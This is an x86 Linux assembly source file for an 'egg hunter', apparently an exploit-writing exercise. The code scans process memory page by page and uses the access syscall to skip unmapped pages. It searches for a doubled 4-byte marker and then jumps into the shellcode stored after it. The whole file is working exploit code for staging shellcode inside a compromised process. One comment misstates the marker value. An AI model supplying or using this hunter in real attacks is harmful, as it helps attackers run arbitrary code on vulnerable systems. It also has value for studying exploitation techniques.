; Filename: EggHunter.nasm
; Author: Jeremy Catelain

global _start

section .text
_start:

	xor eax, eax ; initialization of the EAX register
	mov esi, eax ; initialization of the ESI register
	
	; Egg initialization
	mov esi, dword 0x50905090

next_page : 
    or dx, 0xfff ; or operation to go to the next page, 4095


next_address :
	inc edx ; the value become 4096 = 0x1000
    pusha ; save the current registers
    lea ebx, [edx + 0x4] ; load the address at the first address of the current page
    mov al, 0x21 ; 0x21 is the heximal value of 33
    int 0x80 ; access syscal
	
	cmp al, 0xf2 ; Check if the return value is a EFAULT
	popa ; get the registers back
	je short next_page ; in case of EFAULT, go to the next page
	
	cmp [edx], esi ; compare the value at the address with our egg
	jnz next_address ; jump to the next_address if not equals
	cmp [edx + 0x4], esi ; compare the value of the next 4 bytes with our egg (0x90509050)

	jnz next_address ; jump to the next address if not equals

	jmp edx ; jump to the shellcode if the egg is found

